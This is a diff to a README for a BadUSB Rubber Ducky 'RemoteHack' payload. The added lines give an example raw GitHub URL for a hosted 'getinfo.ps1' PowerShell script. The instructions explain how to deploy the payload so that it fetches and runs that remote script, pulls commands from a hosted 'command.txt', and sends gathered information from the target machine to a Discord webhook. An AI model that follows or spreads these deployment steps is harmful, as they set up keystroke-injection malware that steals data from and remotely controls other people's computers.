@@ -19,8 +19,12 @@ EXAMPLE:
 4. On your BadUSB Rubber Ducky device, install the script from `RemoteHack.txt`.
 
 
-5. Replace `'link-to/getinfo.ps1'` in the script with the custom hosted URL of your `.ps1` file within the duplicated GitHub repository.
+5. Replace `'link-to/getinfo.ps1'` in the script with the custom hosted URL of your `.ps1` file within the duplicated GitHub repository,
+Example:
+`link-to/getinfo.ps1` ==> `https://github.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/raw/main/getinfo.ps1`
 
 
 5.The updated RemoteHack.txt is your new payload file.
+
+
 By following these steps, you can deploy and customize the GetInfo script for your specific use case. Ensure that the Discord webhook and the URL to `command.txt` in your duplicated GitHub repository are correctly configured in the `.ps1` file for the script to function as intended, securely transmitting gathered information to your Discord server.
